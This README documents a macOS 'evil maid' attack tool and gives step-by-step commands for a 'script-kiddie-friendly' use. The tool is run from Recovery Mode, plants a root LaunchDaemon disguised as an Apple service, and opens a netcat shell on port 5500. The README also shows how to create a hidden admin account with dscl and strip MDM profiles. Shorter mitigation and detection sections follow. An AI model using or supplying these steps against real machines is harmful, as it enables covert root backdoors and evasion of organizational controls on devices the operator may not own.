# Evil Maid — macOS Privilege Escalation via Recovery Mode

> Educational / Authorized Testing Only
>
> This repository documents a physical-access attack chain on macOS. It is intended **solely** for security research, red-team engagements on hardware you own, and defensive hardening reference. Unauthorized use against systems you don't own is illegal.

---

This is a tool I made through macOS redteaming research and I felt it necessary to document this as at some point I was in the locked out of my own Mac MDM challenge. (**I would have wished I had this 😂**)  This works on macOS Sequoia and untested on Tahoe (ikely to work). 


## If MDM made it so that you only have standard permissions over your Mac, you came to the right place. Good job!

🟢 [**→ Click Here! ←**](#the-simple-version-tldr)


## Two Paths to Root

This technique sits at an interesting intersection — it can be used for **legitimate liberation** or for **malicious compromise**, depending entirely on who's holding the keyboard.

###  Path 1 — The Locked-Out Owner

You **own** the Mac. You paid for it. But you're stuck as a **standard user** because:

- Your employer or school enrolled it in **MDM** (Jamf, Kandji, Intune, etc.) and locked admin behind a provisioning profile.
- An IT administrator left and nobody knows the admin password.
- You bought a second-hand Mac that's still MDM-bound to the previous org.
- A family member set you up without admin and forgot the credentials.

You have **physical possession**, you have **legitimate ownership**, but macOS treats you like a guest on your own hardware. Recovery Mode doesn't care about MDM-enforced user restrictions — it runs underneath the OS-level policy layer. This technique lets you **reclaim admin on hardware you rightfully own**.
[**→ Click Here! ←**](#the-simple-version-tldr)

> **Ethical stance:** If it's your device, you should be able to control it. MDM is a management tool, not a prison.

###  Path 2 — The Evil Maid

An attacker gains **temporary physical access** to a Mac they do **not** own:

- A laptop left unattended in a coffee shop, hotel room (the classic "evil maid" scenario), or office.
- A device checked into baggage at the airport.
- A target machine in a shared workspace or colocation facility.

The attacker reboots into Recovery Mode, runs the script from a USB drive, and walks away. Minutes later, they have a root shell calling home. No admin password needed. No user interaction. No trace of authentication.

> **Legal reality:** This is computer intrusion. Don't do it on hardware you don't own.

### Quick Comparison

| | Path 1 — Owner | Path 2 — Attacker |
|---|---|---|
| **Ownership** | Legitimate | None |
| **Goal** | Regain admin on own device | Unauthorized root access |
| **MDM context** | MDM is the *obstacle* | MDM is the *defender* |
| **Physical access** | Always have it | Temporary / covert |
| **Legal status** | Your hardware, your rules | Illegal (CFAA, etc.) |
| **Ethical stance** | Self-help / right-to-repair | Malicious intrusion |

---

## The Simple Version (TL;DR)

This is the stripped-down, script-kiddie-friendly version. No theory, no yapping — just root.

**You need:** Your Mac, a USB drive, and any other computer/phone on the same Wi-Fi.

### 1. Put `build.sh` on a USB drive

Download this repo, copy `build.sh` onto a USB stick. That's it.

### 2. Boot into Recovery Mode

- **Intel Mac:** Hold `⌘ + R` while restarting.
- **Apple Silicon Mac:** Hold the power button, then Options → Continue.

### 3. Open Terminal & run the script

In Recovery Mode: **Utilities → Terminal**, then:

```bash
# Find your USB (it'll be under /Volumes/)
ls /Volumes/

# Run the script (replace USBDRIVE with your USB name)
sh /Volumes/USBDRIVE/build.sh
```

It'll print an IP address and port. Write them down.

### 4. Reboot normally

Apple menu → Restart. Let it boot back to your normal desktop.

### 5. Connect to your root shell

Log back in and open terminal. Run this command to connect to the shell you created.

```bash
nc 127.0.0.1 5500
```

Boom. You're root. You'll see a `#` prompt.

### 6. Set a root password

In that root shell, run:

```bash
dscl . -passwd /Users/root
```

Type a new password (twice). You won't see the characters — that's normal.

### 7. Done. Log in as root.

Restart your Mac. At the login screen, choose **Other…** and log in with:

- Username: `root`
- Password: whatever you just set

You now have full admin. MDM can't stop you anymore.

> **That's literally it.** Recovery → USB → script → reboot → nc → `dscl` → restart → root.

---

## Overview

A **standard (non-admin) user** uses it in this way to gain root access.

1. Boot into **macOS Recovery Mode** (unauthenticated — no username or password required).
2. Mount the system volume and drop a malicious **LaunchDaemon** that runs as `root`.
3. Reboot normally — the daemon spawns a **reverse shell** listening on a configurable port.
4. From the root shell, **activate the root user** (`dsenableroot`), completing the privilege escalation.

This attack **does** require FileVault to be disabled. Thankfully for the **LEGITIMATE** users of this software FileVault is disabled by default.

## Attack Chain

```mermaid
flowchart LR
    A[Physical Access] --> B[Reboot → Recovery Mode<br/>⌘+R / Power hold]
    B --> C[Mount system volume<br/>via Disk Utility / Terminal]
    C --> D[Run build.sh<br/>from USB / network share]
    D --> E[LaunchDaemon installed<br/>on system volume]
    E --> F[Normal reboot]
    F --> G[LaunchDaemon starts<br/>reverse shell on port 5500]
    G --> H[Connect via netcat<br/>→ root shell]
    H --> I[dsenableroot<br/>→ root account activated]
```

## Files

| File | Purpose |
|------|---------|
| `build.sh` | The installer script, run from Recovery Mode's Terminal. It places the payload and LaunchDaemon on the target system volume. |

## Usage

### Prerequisites

- Physical access to the target Mac.
- A USB drive (or network share accessible from Recovery Mode) containing this repository.
- A second machine on the same network to receive the reverse shell.

### Step 1 — Boot into Recovery Mode

- **Intel Macs:** Hold `Command (⌘) + R` during boot.
- **Apple Silicon Macs:** Press and hold the power button until "Loading startup options" appears, then select **Options** → **Continue**.


### Step 2 — Mount the system volume

Recovery Mode may auto-mount the internal drive under `/Volumes/`. If not, open **Disk Utility**, select the internal "Macintosh HD" (or equivalent), and click **Mount**.

Confirm the system volume is accessible:

```bash
ls /Volumes/*/System/Library/CoreServices
```

### Step 3 — Run the installer

From the **Recovery Mode Terminal** (Utilities → Terminal), run:

```bash
# Example: script is on a USB drive named "USBDRIVE"
sh /Volumes/USBDRIVE/build.sh
```

The script will:

1. Locate the system volume automatically.
2. Create a hidden payload directory at `/private/var/tmp/.systemupdate/`.
3. Write the reverse-shell agent (`networkd`) and a LaunchDaemon plist (`com.apple.networkd.plist`) masquerading as a legitimate Apple service.
4. Set the C2 (command & control) port to **5500**.

> **Custom port:** Edit the `C2_PORT` variable at the top of `build.sh` if you need a different port.

### Step 4 — Reboot & catch the shell

Reboot the Mac normally. After the system reaches the login window (or desktop), the LaunchDaemon fires and begins listening.

From your second machine, connect:

```bash
nc <target-ip> 5500
```

You will land in a **root shell** (`/bin/bash -i`) because the LaunchDaemon specifies `UserName: root`.

### Step 5 — Persist root access

```bash
# Enable the root user with a password you control
dsenableroot
# Or change the root password if already enabled
passwd root
```

You can also create a hidden admin account:

```bash
dscl . -create /Users/.hiddenadmin
dscl . -create /Users/.hiddenadmin UserShell /bin/bash
dscl . -create /Users/.hiddenadmin UniqueID 401
dscl . -create /Users/.hiddenadmin PrimaryGroupID 20
dscl . -create /Users/.hiddenadmin NFSHomeDirectory /var/.hiddenadmin
dscl . -passwd /Users/.hiddenadmin <password>
dscl . -append /Groups/admin GroupMembership .hiddenadmin
```

### Step 6 (Path 1 — Owner) — Clean up MDM

If you're reclaiming your own MDM-locked device, once you have root you can remove the MDM enrollment profile:

```bash
# List MDM profiles
profiles -L

# Remove the MDM enrollment profile (use the identifier from profiles -L)
profiles -R -p <profile-identifier>

# Alternatively, remove all configuration profiles
profiles -D -f -v
```

> Removing MDM profiles will alert the managing organization that the device has fallen out of compliance. If it's your personal device that was mistakenly enrolled, this is your prerogative. If it's employer-owned hardware, be aware this likely violates your IT policy.

## Why This Works

Recovery Mode on macOS runs with **effectively unlimited privileges** — it can mount and modify any APFS volume on disk. There is no user authentication gate because Apple's threat model for Recovery Mode assumes the operator is the device owner.

This is by design: if you forget your password, Recovery Mode is how Apple expects you to reset it. The same power that lets you run `resetpassword` also lets you run `build.sh`.

Key design choices that enable this:

- **No SIP in Recovery Mode.** System Integrity Protection is off by default in Recovery, allowing unrestricted writes.
- **No user auth.** Recovery Mode does not ask for a username/password — only a firmware password (if configured) or Apple ID (on Apple Silicon with Activation Lock).
- **LaunchDaemons run as root.** A plist placed in `/Library/LaunchDaemons/` with `UserName: root` executes with full privileges at boot, before any user logs in — and before any MDM policy enforcement begins.
- **MDM is an OS-level construct.** Recovery Mode runs *underneath* the installed OS. MDM profiles, configuration policies, and user restrictions simply don't exist in that environment.

## Mitigations

Defenders can harden against this attack with these measures:

| Mitigation | Effectiveness | Notes |
|------------|---------------|-------|
| **Firmware password** (Intel) / **Secure Boot → Full Security** (Apple Silicon) |  High | Prevents booting into Recovery Mode without authentication. This is the single most effective control. |
| **FileVault (full-disk encryption)** |  Medium | Attacker cannot read user data, but can still modify the OS volume if it's unencrypted (standard APFS layout). Combined with a firmware password, this is much stronger. |
| **MDM / endpoint monitoring** |  Medium | Can alert on new LaunchDaemons, unexpected listening ports, or `dsenableroot` usage — but only *after* the fact. MDM does not prevent the initial compromise because Recovery Mode bypasses it entirely. |
| **Physical security** |  High | Lock the device. Don't leave it unattended. The evil maid can't strike if she can't touch the hardware. |

> **Combined defense:** A firmware password + FileVault + physical security is the recommended posture for sensitive environments. MDM alone will **not** stop this attack.

## Detection

Blue teams can look for:

- Unexpected plist files in `/Library/LaunchDaemons/` — especially ones mimicking Apple naming (`com.apple.*`).
- Unexpected listening ports (`lsof -i :5500`, `netstat -an | grep 5500`).
- Hidden directories under `/private/var/tmp/` (e.g., `.systemupdate`).
- `dsenableroot` or `dscl` invocations in unified logs (`log show --predicate 'process == "dsenableroot"'`).
- Sudden disappearance of MDM enrollment profiles without administrative action through the MDM console.

## Important Caveat

During **manufacturing or when macOS is installed**, the system volume is signed with a cryptographic seal. If the Mac has a T2 chip or Apple Silicon and the `csrutil` authenticated-root setting is enabled, modifying the system volume will **break the seal** and may trigger a warning or prevent booting depending on the Secure Boot policy. This script targets the **data volume** components (`/private/var/tmp/` and `/Library/LaunchDaemons/` which live on the writable Data volume), so the seal is not affected.

## FAQ

### Does this work on Apple Silicon?

Yes. The process is identical — hold the power button to enter startup options, select Options, and proceed. The only difference is that Apple Silicon Macs may have Activation Lock enabled (tied to an Apple ID), which adds an additional auth gate.

### Will MDM detect this?

Not during the attack. MDM only functions when macOS is running. Recovery Mode is a separate boot environment. Once macOS boots with the backdoor active, MDM *could* detect the anomalous LaunchDaemon or listening port — but by then you already have root.

### Does FileVault stop this?

Partially. FileVault encrypts user data, but on a standard APFS installation the OS volume itself is not encrypted. The LaunchDaemon directory (`/Library/LaunchDaemons/`) lives on the Data volume, which *is* encrypted with FileVault. However, in Recovery Mode, after unlocking the volume with a known password (or if the volume is mounted), modification is possible.

### Is this a vulnerability?

No, this is not a CVE-worthy vulnerability. It's a well-understood consequence of Apple's recovery architecture: physical access + no firmware password = game over. Apple's documentation explicitly recommends setting a firmware password for sensitive environments. This repository simply automates the exploitation of that design.

## Disclaimer

This tool is provided for **authorized security research, red-team assessments, and legitimate device recovery only**. The author assumes no liability for misuse. If you don't own the hardware or lack explicit written permission — don't run this.

## License

MIT — do what you want, but don't be evil.
